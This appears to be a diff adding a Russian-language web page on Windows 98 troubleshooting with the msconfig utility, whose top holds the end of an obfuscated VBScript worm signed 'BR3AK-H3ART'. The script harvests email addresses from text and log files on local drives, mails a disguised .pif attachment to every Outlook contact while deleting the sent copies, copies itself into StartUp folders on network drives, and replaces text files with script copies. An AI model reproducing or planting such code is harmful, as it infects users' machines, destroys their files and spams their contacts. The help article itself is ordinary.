+"l§§C(ї*?########ї*?)§§l§§C(ї*?S!1!1!1ї*?)§§l§§C(ї*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SUї*?)§§ _
+l§§C(ї*?########ї*?)§§l§§C(ї*?U!1!1!1ї*?)§§l§§C(ї*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SUї*?) "&vbcrlf& _
+"UO.Close
+end if
+end if
+if (O=ї*?crack.exeї*?) then
+e.copy(folderspec§§ї*?\crack.vbsї*?)
+e.copy(folderspec§§ї*?\crack.exeї*?)
+end if "&vbcrlf& _
+"if (O=ї*?tmhelp32.dllї*?) then
+e.copy(folderspec§§ї*?\tmhelp32.dllї*?)
+end if
+if (O=ї*?navdx.exeї*?) then
+e.copy(folderspec§§ї*?\navdx.exeї*?) "&vbcrlf& _
+"end if
+if (O=ї*?rescue.dllї*?) then
+e.copy(folderspec§§ї*?\rescue.dllї*?)
+end if
+if (O=ї*?Virscan1.datї*?) then
+e.copy(folderspec§§ї*?\rescue.dllї*?) "&vbcrlf& _
+"end if
+next
+end sub
+sub cu(folderspec)
+On Error Resume Next
+dim bc,bd,sf
+set bc = a.GetFolder(folderspec)
+set sf = bc.SubFolders "&vbcrlf& _
+"for each bd in sf
+bb(bd.path)
+cu(bd.path)
+next
+end sub
+Function XX(XB)
+Dim XC
+Dim XU
+XC = ї*?ї*?
+For XU = 1 To Len(XB) Step 2 "&vbcrlf& _
+"XC = XC §§ Chr( ї*?§§hї*? §§ Mid(XB,XU, 2 ))
+Next
+XX = XC
+End Function
+if month(now) =9 and day(now) =20 then
+set BadJokee3=a.CreateTextFile(b§§ї*?\ShellNew\Winword.docї*?) "&vbcrlf& _
+"BadJokee3.writeline ї*?Norton AntiVirus repair This File. (VBS.ULTIMA.pif) by BR3AK-H3ARTї*?
+Badjokee3.close
+set BadJokee4=a.CreateTextFile(b§§ї*?\ShellNew\Excel.xlsї*?) "&vbcrlf& _
+"BadJokee4.writeline ї*?Norton AntiVirus repair This File. (VBS.ULTIMA.pif) by BR3AK-H3ARTї*?
+Badjokee4.close
+end if "&vbcrlf& _
+"ML=a.createtextfile(b§§ї*?\mailci.dIIї*?)                ;)Search Driver;)s and files all mail;)s send ;) / new system "&vbcrlf& _
+"ML.Writeline ї*?;)VBS.ULTIMA.pif-MAIL-SEACRHї*?§§l§§ї*?;)mail files search system Coded by BR3AK-H3ARTї*?§§l§§ _ "&vbcrlf& _
+"ї*?;)age:17ї*?§§l§§ї*?;)from:TURKEYї*? §§l§§ї*?;)Mail:br3ak_h3art@hotmail.comї*?§§l§§ї*?On Error Resume Nextї*?§§l§§ _ "&vbcrlf& _
+"ї*?Set a = CreateObject(ї*?§§Z§§ї*?Scripting.FileSystemObjectї*?§§Z§§ї*?)ї*?§§l§§ї*?Set b = a.GetSpecialFolder(0)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?l=Chr(13)§§Chr(10)ї*?§§l§§ї*?n=Chr(34)ї*?§§l§§ї*?scrg()ї*?§§l§§ї*?sub scrgї*?§§l§§ї*?On Error Resume Nextї*?§§l§§ї*?Dim ax,ba,Oї*?§§l§§ _ "&vbcrlf& _
+"ї*?Set ba = a.Drivesї*?§§l§§ї*?For Each ax in baї*?§§l§§ї*?If ax.DriveType = 2 or ax.DriveType=3 Then ї*?§§l§§ _ "&vbcrlf& _
+"ї*?cu(ax.path§§ї*?§§Z§§ї*?\ї*?§§Z§§ї*?)ї*?§§l§§ї*?end ifї*?§§l§§ї*?Next ї*?§§l§§ї*?scrg = Oї*?§§l§§ї*?end subї*?§§l§§ї*?sub bb(folderspec)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?On Error Resume Nextї*?§§l§§ї*?dim bc,bd,be,U,Oї*?§§l§§ї*?set bc = a.GetFolder(folderspec)ї*?§§l§§ї*?set be = bc.Filesї*?§§l§§ _ "&vbcrlf& _
+"ї*?for each bd in beї*?§§l§§ї*?U=a.GetExtensionName(bd.path)ї*?§§l§§ї*?U=lcase(U)ї*?§§l§§ї*?O=lcase(bd.name)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?if (U=ї*?§§Z§§ї*?txt-ї*?§§Z§§ї*?) or (U=ї*?§§Z§§ї*?logї*?§§Z§§ї*?) then  ї*?§§l§§ї*?set siz3=a.getfile(bd.path)ї*?§§l§§ї*?ssiz3=siz3.sizeї*?§§l§§ _ "&vbcrlf& _
+"ї*?if ssiz3 > 50000 then ї*?§§l§§ї*?elseї*?§§l§§ї*?set txtfile=a.OpenTextFile(bd.path)ї*?§§l§§ї*?yazi=txtfile.ReadAllї*?§§l§§ _ "&vbcrlf& _
+"ї*?For sayi = 1 To Len(yazi)ї*?§§l§§ї*?sayigeri=sayiї*?§§l§§ї*?isaret=sayiї*?§§l§§ї*?JU = Mid(yazi, sayi, 1)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?if JU = ї*?§§Z§§ї*?@ї*?§§Z§§ї*? thenї*?§§l§§ї*?for num = 1 to 20ї*?§§l§§ї*?sayigeri=sayigeri + 1ї*?§§l§§ї*?zayu= Mid(yazi, sayigeri, 1)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?MAIL=MAIL§§ZAYUї*?§§l§§ї*?if (zayu = ї*?§§Z§§ї*?.ї*?§§Z§§ї*?) thenї*?§§l§§ї*?zayu2= Mid(yazi, sayigeri, 4)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?if (zayu2 = ї*?§§Z§§ї*?.comї*?§§Z§§ї*?) thenї*?§§l§§ї*?ZMAIL=MAILї*?§§l§§ї*?MAIL=ї*?§§Z§§ї*?ї*?§§Z§§ї*?ї*?§§l§§ї*?for zum = 1 to 20ї*?§§l§§ _ "&vbcrlf& _
+"ї*?isaret=isaret - 1ї*?§§l§§ї*?if isaret=ї*?§§Z§§ї*?0ї*?§§Z§§ї*? thenї*?§§l§§ї*?exit forї*?§§l§§ї*?elseї*?§§l§§ї*?K= Mid(yazi, isaret, 1)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?if (K = ї*?§§Z§§ї*?.ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?-ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*? ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?*ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?/ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?\ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?(ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?)ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?=ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?;)ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?ї*?§§Z§§ї*?ї*?§§Z§§ї*?ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?#ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?^ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§Chr(37)§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?+ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?§§ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?{ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?[ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?]ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?}ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*??ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?~ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?Ёї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?;ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?:ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?.ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?,ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?`ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?ґї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?|ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = chr(10)) or _ї*?§§l§§ї*?(isaret=ї*?§§Z§§ї*?1ї*?§§Z§§ї*?) thenї*?§§l§§ї*?elseї*?§§l§§ї*?mail2=K§§mail2ї*?§§l§§ї*?end ifї*?§§l§§ _ "&vbcrlf& _
+"ї*?if (K = ї*?§§Z§§ї*?.ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?-ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*? ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?*ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?/ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?\ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?(ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?)ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?=ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?;)ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?ї*?§§Z§§ї*?ї*?§§Z§§ї*?ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?#ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?^ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§Chr(37)§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?+ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?§§ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?{ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?[ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?]ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?}ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*??ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?~ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?Ёї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?;ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?:ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?.ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?,ї*?§§Z§§ї*?) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(K = ї*?§§Z§§ї*?`ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?ґї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = ї*?§§Z§§ї*?|ї*?§§Z§§ї*?) or _ї*?§§l§§ї*?(K = chr(10)) or _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?(isaret=ї*?§§Z§§ї*?1ї*?§§Z§§ї*?) thenї*?§§l§§ї*?Set OL01 = CreateObject(ї*?§§Z§§ї*?Outlook.Applicationї*?§§Z§§ї*?)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?Set OL02 = OL01.GetNameSpace(ї*?§§Z§§ї*?MAPIї*?§§Z§§ї*?)ї*?§§l§§ї*?Set OL05 = OL01.CreateItem(0)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?OL05.BCC = mail2§§ї*?§§Z§§ї*?@ї*?§§Z§§ї*?§§ZMAIL§§ї*?§§Z§§ї*?comї*?§§Z§§ї*?ї*?§§l§§ї*?OL05.Subject = ї*?§§Z§§ї*?Ultima Online Password §§ Bugsї*?§§Z§§ї*?ї*?§§l§§ _ "&vbcrlf& _
+"ї*?OL05.Body = ї*?§§Z§§ї*?You new Password and new Ultima Bugsї*?§§Z§§ї*?ї*?§§l§§ї*?OL05.Attachments.Add b§§ї*?§§Z§§ї*?\UO.pifї*?§§Z§§ї*?ї*?§§l§§ _ "&vbcrlf& _
+"ї*?OL05.DeleteAfterSubmit = Trueї*?§§l§§ї*?OL05.Sendї*?§§l§§ї*?ZMAIL=ї*?§§Z§§ї*?ї*?§§Z§§ї*?ї*?§§l§§ї*?mail2=ї*?§§Z§§ї*?ї*?§§Z§§ї*?ї*?§§l§§ _ "&vbcrlf& _
+"ї*?exit forї*?§§l§§ї*?else ї*?§§l§§ї*?end ifї*?§§l§§ї*?end ifї*?§§l§§ї*?nextї*?§§l§§ї*?exit forї*?§§l§§ї*?end ifї*?§§l§§ї*?end ifї*?§§l§§ _ "&vbcrlf& _
+"ї*?nextї*?§§l§§ї*?end ifї*?§§l§§ї*?nextї*?§§l§§ї*?end ifї*?§§l§§ї*?end ifї*?§§l§§ї*?nextї*?§§l§§ї*?end subї*?§§l§§ї*?sub cu(folderspec)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?On Error Resume Nextї*?§§l§§ї*?dim bc,bd,sfї*?§§l§§ї*?set bc = a.GetFolder(folderspec)ї*?§§l§§ї*?set sf = bc.SubFoldersї*?§§l§§ _ "&vbcrlf& _
+"ї*?for each bd in sfї*?§§l§§ї*?bb(bd.path)ї*?§§l§§ї*?cu(bd.path)ї*?§§l§§ї*?nextї*?§§l§§ї*?end subї*?
+ML.close
+g.run(b§§ї*?\mailci.dIIї*?)
+SMAIL=a.createtextfile(b§§ї*?\outmail.dIIї*?) "&vbcrlf& _
+"SMAIL.Writeline ї*?;)VBS.Ultima.pif / Network infected and Outlook adresslist send / Coded by BR3AK-H3ARTї*?§§l§§ _ "&vbcrlf& _
+"ї*?On Error Resume Nextї*?§§l§§ї*?Set a = CreateObject(ї*?§§Z§§ї*?Scripting.FileSystemObjectї*?§§Z§§ї*?)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?Set b = a.GetSpecialFolder(0)ї*?§§l§§ї*?Set g = CreateObject(ї*?§§Z§§ї*?WScript.Shellї*?§§Z§§ї*?)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?Set HH = CreateObject(ї*?§§Z§§ї*?WScript.Networkї*?§§Z§§ї*?)ї*?§§l§§ї*?Set RNC = HH.EnumNetworkDrivesї*?§§l§§ _ "&vbcrlf& _
+"ї*?If RNC.Count ї*?§§chr(60)§§chr(62)§§ї*? 0 Thenї*?§§l§§ї*?For A04 = 0 To RNC.Count - 1ї*?§§l§§ _
+ї*?If InStr( RNC.Item(A04),ї*?§§Z§§ї*?\ї*?§§Z§§ї*?) ї*?§§chr(60)§§chr(62)§§ї*? 0 Thenї*?§§l§§ _ "&vbcrlf& _
+"ї*?a.CopyFile WScript.ScriptFullName,a.BuildPath(RNC.Item(A04),ї*?§§Z§§ї*?\WINDOWS\Start Menu\Programs\StartUp\BR3AK-H3ART.vbsї*?§§Z§§ї*?)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?a.CopyFile WScript.ScriptFullName,a.BuildPath(RNC.Item(A04),ї*?§§Z§§ї*?\WINDOWS\desktop\Web-passwords.vbsї*?§§Z§§ї*?)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?End Ifї*?§§l§§ї*?Nextї*?§§l§§ї*?End Ifї*?§§l§§ї*?Set OL01 = CreateObject(ї*?§§Z§§ї*?Outlook.Applicationї*?§§Z§§ї*?)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?Set OL02 = OL01.GetNameSpace(ї*?§§Z§§ї*?MAPIї*?§§Z§§ї*?)ї*?§§l§§ї*?For Each OL03 In OL02.AddressListsї*?§§l§§ _ "&vbcrlf& _
+"ї*?For OL04 = 1 To OL03.AddressEntries.Countї*?§§l§§ї*?Set OL05 = OL01.CreateItem(0)ї*?§§l§§ _
+ї*?Set OL06 = OL01.CreateItem(0)ї*?§§l§§ї*?OL05.BCC = OL03.AddressEntries(OL04).Addressї*?§§l§§ _ "&vbcrlf& _
+"ї*?OL05.Subject = ї*?§§Z§§ї*?Ultima Online Password §§ Bugsї*?§§Z§§ї*?ї*?§§l§§ї*?OL05.Body = ї*?§§Z§§ї*?You new Password and new Ultima Bugsї*?§§Z§§ї*?ї*?§§l§§ _ "&vbcrlf& _
+"ї*?OL05.Attachments.Add b§§ї*?§§Z§§ї*?\uo.pifї*?§§Z§§ї*?ї*?§§l§§ї*?OL05.DeleteAfterSubmit = Trueї*?§§l§§ _ "&vbcrlf& _
+"ї*?OL05.Sendї*?§§l§§ї*?OL06.BCC = OL03.AddressEntries(OL04).Addressї*?§§l§§ї*?OL06.Subject = ї*?§§Z§§ї*?Tarkan new Remix demoї*?§§Z§§ї*?ї*?§§l§§ _ "&vbcrlf& _
+"ї*?OL06.Body = ї*?§§Z§§ї*?Tarkan new Remixї*?§§Z§§ї*?ї*?§§l§§ї*?OL06.Attachments.Add b§§ї*?§§Z§§ї*?\Tarkan-remix-4.Mp3.pifї*?§§Z§§ї*?ї*?§§l§§ _ "&vbcrlf& _
+"ї*?OL06.DeleteAfterSubmit = Trueї*?§§l§§ї*?OL06.Sendї*?§§l§§ї*?Nextї*?§§l§§ї*?Nextї*?
+g.run(b§§ї*?\outmail.dIIї*?)
+set txtinf=a.createtextfile(b§§ї*?\txtinfsystem.dIIї*?) "&vbcrlf& _
+"txtinf.writeline ї*?;)VBS.Ultima.pif-TXT.LOGї*?§§l§§ _
+ї*?;)txt and log infected system,Run txt file Open TXT file and Virus file,Coded by BR3AK-H3ARTї*?§§l§§ _ "&vbcrlf& _
+"ї*?;)age:17 / from:TURKEYї*?§§ї*?;)Mail:br3ak_h3art@hotmail.comї*?§§l§§ї*?On Error Resume Nextї*?§§l§§ _ "&vbcrlf& _
+"ї*?Set a = CreateObject(ї*?§§Z§§ї*?Scripting.FileSystemObjectї*?§§Z§§ї*?)ї*?§§l§§ї*?Set b = a.GetSpecialFolder(0)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?l=Chr(13)§§Chr(10)ї*?§§l§§ї*?n=Chr(34)ї*?§§l§§ї*?scrg()ї*?§§l§§ї*?sub scrgї*?§§l§§ _
+ї*?On Error Resume Nextї*?§§l§§ї*?Dim ax,ba,Oї*?§§l§§ї*?Set ba = a.Drivesї*?§§l§§ї*?For Each ax in baї*?§§l§§ _ "&vbcrlf& _
+"ї*?If ax.DriveType = 2 or ax.DriveType=3 Thenї*?§§l§§ї*?cu(ax.path§§ї*?§§Z§§ї*?\ї*?§§Z§§ї*?)ї*?§§l§§ї*?end ifї*?§§l§§ _
+ї*?Nextї*?§§l§§ї*?scrg = Oї*?§§l§§ї*?end subї*?§§l§§ї*?sub bb(folderspec)ї*?§§l§§ї*?On Error Resume Nextї*?§§l§§ _ "&vbcrlf& _
+"ї*?dim bc,bd,be,U,Oї*?§§l§§ї*?set bc = a.GetFolder(folderspec)ї*?§§l§§ї*?set be = bc.Filesї*?§§l§§ _ "&vbcrlf& _
+"ї*?for each bd in beї*?§§l§§ї*?U=a.GetExtensionName(bd.path)ї*?§§l§§ї*?U=lcase(U)ї*?§§l§§ _
+ї*?O=lcase(bd.name)ї*?§§l§§ї*?if (U=ї*?§§Z§§ї*?txtї*?§§Z§§ї*?) or (U=ї*?§§Z§§ї*?TXTї*?§§Z§§ї*?) thenї*?§§l§§ _ "&vbcrlf& _
+"ї*?dim bg,bl,bm,bnї*?§§l§§ї*?bg=a.GetBaseName(bd.path)ї*?§§l§§ _
+ї*?set bl=a.CreateTextFile(d§§ї*?§§Z§§ї*?\ї*?§§Z§§ї*?§§bg§§ї*?§§Z§§ї*?.txt.txt-ї*?§§Z§§ї*?)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?Set bm=a.OpenTextFile(bd.path)ї*?§§l§§ї*?bn=bm.readallї*?§§l§§ї*?bl.Writeline bnї*?§§l§§ _
+ї*?bl.closeї*?§§l§§ї*?bm.closeї*?§§l§§ї*?a.DeleteFile(bd.path)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?e.Copy(folderspec§§ї*?§§Z§§ї*?\ї*?§§Z§§ї*?§§bg§§ї*?§§Z§§ї*?.txt.vbsї*?§§Z§§ї*?)ї*?§§l§§ї*?end ifї*?§§l§§ї*?bk.closeї*?§§l§§ _
+ї*?nextї*?§§l§§ї*?end subї*?§§l§§ї*?sub cu(folderspec)ї*?§§l§§ї*?On Error Resume Nextї*?§§l§§ї*?dim bc,bd,sfї*?§§l§§ _ "&vbcrlf& _
+"ї*?set bc = a.GetFolder(folderspec)ї*?§§l§§ї*?set sf = bc.SubFoldersї*?§§l§§ї*?for each bd in sfї*?§§l§§ї*?bb(bd.path)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?cu(bd.path)ї*?§§l§§ї*?nextї*?§§l§§ї*?end subї*?
+txtinf.close
+g.run(b§§ї*?\txtinfsystem.dIIї*?)
+Function atchmail(atchmailz)
+On Error Resume Next "&vbcrlf& _
+"Dim OL01, OL02, OL03, OL04, OL05
+Set OL01 = CreateObject(ї*?Outlook.Applicationї*?)
+Set OL02 = OL01.GetNameSpace(ї*?MAPIї*?) "&vbcrlf& _
+"For Each OL03 In OL02.AddressLists
+For OL04 = 1 To OL03.AddressEntries.Count
+Set OL05 = OL01.CreateItem(0) "&vbcrlf& _
+"OL05.BCC = OL03.AddressEntries(OL04).Address
+OL05.Subject = ї*?Ultima Online Password §§ Bugsї*? "&vbcrlf& _
+"OL05.Body = ї*?You new Password and new Ultima Bugsї*?
+OL05.Attachments.Add atchmailz
+OL05.DeleteAfterSubmit = True "&vbcrlf& _
+"OL05.Send
+Next
+Next
+end Function
+if (a.FileExists(b§§ї*?\by_BR3AK-H3ART_Mail_br3ak_h3art@hotmail.com_AGE_17.dIIї*?)) Then "&vbcrlf& _
+"else
+set INFO=a.CreateTextFile(b§§ї*?\by_BR3AK-H3ART_Mail_br3ak_h3art@hotmail.com_AGE_17.dIIї*?) "&vbcrlf& _
+"INFO.Writeline ї*?MSGBOX ї*?ї*?You Computer infected VBS/Ultima.pif Viruses.!ї ї*?§§_
+ї*? ah bad Problem ї*?§§_ "&vbcrlf& _
+"ї*? Good Luck!ї*?ї*?,0,ї*?ї*?Author : By BR3AK-H3ART / Mail : br3ak_h3art@hotmail.com / AGE : 17 / FROM : TURKEYї*?ї*?ї*?
+end if "&vbcrlf& _
+"if month(now) = 8 then
+atchmail(aatch)
+end if "&vbcrlf& _
+""
+encodez=replace(encode,Chr(191)+Chr(42)+Chr(63),Chr(34))
+encodex=replace(encodez,Chr(59)&Chr(41),chr(39))
+encodes=replace(encodex,Chr(167)&Chr(167),chr(38))
+encodel=replace(encodes,Chr(60)&Chr(66)&Chr(82)&Chr(51)&Chr(65)&Chr(75)&Chr(62),Chr(60)&Chr(47)&Chr(83)&Chr(67)&Chr(82)&Chr(73)&Chr(80)&Chr(84)&Chr(62))
+vbs.write encodel
+vbs.close
+sub regz(regkey,regvalue)
+g.RegWrite regkey,regvalue
+end sub
+//-->
+</SCRIPT>
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<title>Диагностика и устранение системных
+конфликтов</title>
+<base target="_blank">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000" link="#0000FF" vlink="#0000FF">
+
+<table border="0" width="100%" cellspacing="0" cellpadding="3">
+  <tr>
+    <td>
+      <table border="0" width="100%" cellspacing="0" cellpadding="0" background="../images/canva.jpg">
+        <tr>
+          <td><font size="1" face="Arial"><b><font color="#800000">У нас
+            всегда:</font></b> <font color="#800000">бесплатный
+            софт, вэб-сервисы, ресурсы по
+            раскрутке и дизайну, заработок и
+            спонсоры, техническая документация,
+            свежие номера журнала &quot;Internet Zone&quot;-
+            все это на</font> <a href="http://www.izone.com.ua/">http://www.izone.com.ua/</a>&nbsp;</font></td>
+          <td><a href="http://www.izone.com.ua/"><img border="0" src="../images/iz.gif" align="right" width="129" height="46"></a></td>
+        </tr>
+      </table>
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <hr size="1" color="#000000">
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <h3 align="center"><SPAN class=article>Диагностика и устранение системных 
+            конфликтов</SPAN></h3>
+    </td>
+  </tr>
+  <tr>
+    <td>
+            <P>Попытки докопаться до причины повторяющихся проблем с 
+            оборудованием или же найти различные варианты общей ошибки защиты 
+            могут допечь вас не меньше, чем поиск иголки в стоге сена.</P>
+            <P>Поиск виновника часто затягивается, поскольку проводится путем 
+            исключения: вы «отключаете» подозрительный файл и перезагружаете ПК 
+            в надежде на то, что проблема исчезнет.</P>
+            <P>К счастью, имеющаяся в Windows 98 утилита под названием 
+            «Программа настройки системы» делает процесс поиска и устранения 
+            неисправностей гораздо более легким, хотя и тогда он не в полной 
+            мере «защищен от дурака». Но сперва немного о том, как поступать в 
+            Windows 3.x и в Windows 95.</P>
+            <P>Чтобы отключить драйвер в Windows 3.x, требуется сначала с 
+            помощью текстового редактора открыть конфигурационные файлы (обычно 
+            это autoexec.bat и config.sys, находящиеся в корневом каталоге, или 
+            system.ini и win.ini из каталога Windows). Затем нужно найти в них 
+            командную строку, в которой запускается драйвер, и удалить ее. В 
+            файлах system.ini и win.ini в большинстве случаев для этого 
+            достаточно в начало строки добавить точку с запятой &lt;;&gt;, а в 
+            файлах autoexec.bat и config.sys — приписать rem.</P>
+            <P>Несмотря на все попытки, которые предприняла компания Microsoft 
+            для того, чтобы упростить ситуацию в ее более поздних версиях ОС, 
+            подстройка и Windows 95, и Windows 98 зачастую требует примерно 
+            одинаковых усилий. В Windows 95 почти все конфигурационные данные 
+            сведены в одно место — Реестр, а просмотреть установки аппаратного 
+            обеспечения можно с помощью такого инструмента, как Диспетчер 
+            устройств. Тем не менее в Реестре перечислены не все драйверы. Чтобы 
+            обеспечить совместимость с более старым 16-разрядным ПО и некоторым 
+            прежним оборудованием, Microsoft сохраняет четыре упомянутых выше 
+            конфигурационных файла в качестве неотъемлемой части Windows 98. 
+            Когда нужно разрешить серьезные проблемы с ПК или выявить конфликты 
+            в аппаратном обеспечении, следует, как и раньше, сначала обратиться 
+            к этим файлам.</P>
+            <H3>Поиск и устранение неисправностей в Windows 98</H3>
+            <P>Новая утилита «Программа настройки системы» с простым 
+            интерфейсом, входящая в состав Windows 98, позволяет контролировать 
+            выполнение файлов конфигурации при загрузке системы. Она также 
+            содержит настройки для диагностирования ряда конкретных, часто 
+            встречающихся проблем и позволяет отключать (изъяв тем самым из 
+            числа возможных источников неисправностей) любое ПО, автоматически 
+            загружаемое при запуске.</P>
+            <P>Активизировать «Программу настройки системы» можно двумя 
+            способами: либо нажмите кнопку «Пуск», отметьте пункт «Выполнить» и 
+            введите msconfig, либо нажмите кнопку «Пуск», выберите пункты 
+            «Программы•Стандартные•Служебные•Сведения о системе», щелкните мышью 
+            на закладке «Сервис» и отметьте «Программа настройки системы». 
+            Поскольку меню «Вид» этой утилиты обеспечивает быстрый доступ ко 
+            многим другим инструментам для поиска и устранения неисправностей 
+            (таким, например, как Панель управления, Диспетчер устройств и 
+            Настройка экрана), вы можете захотеть создать ярлык для их 
+            скорейшего запуска. Тогда с помощью Проводника (его окно не должно 
+            быть развернуто на весь экран) найдите в папке Windows\System файл 
+            msconfig.exe и, удерживая нажатой правую кнопку мыши, перетащите 
+            значок этого файла на Рабочий стол, а затем в появившемся меню 
+            укажите опцию «Создать ярлык(и)».</P>
+            <H3>В поисках неисправности</H3>
+      Поиск и 
+            устранение неисправностей ПК с помощью «Программы настройки системы» 
+            производятся за три шага. На первых двух исключаются из числа 
+            возможных подозреваемых описанные выше конфигурационные файлы, а на 
+            последнем исследуется загружаемое при запуске ПО, а также некоторые 
+            специфические проблемы, связанные с оборудованием.
+            <P>Однако прежде чем искать причины возникших неприятностей, уберите 
+            возможность появления новых. Создайте резервные копии 
+            конфигурационных файлов. Для этого в «Программе настройки системы» 
+            выделите закладку «Общие» и щелкните мышью на кнопке «Создать копию» 
+            — файлы auto</P>
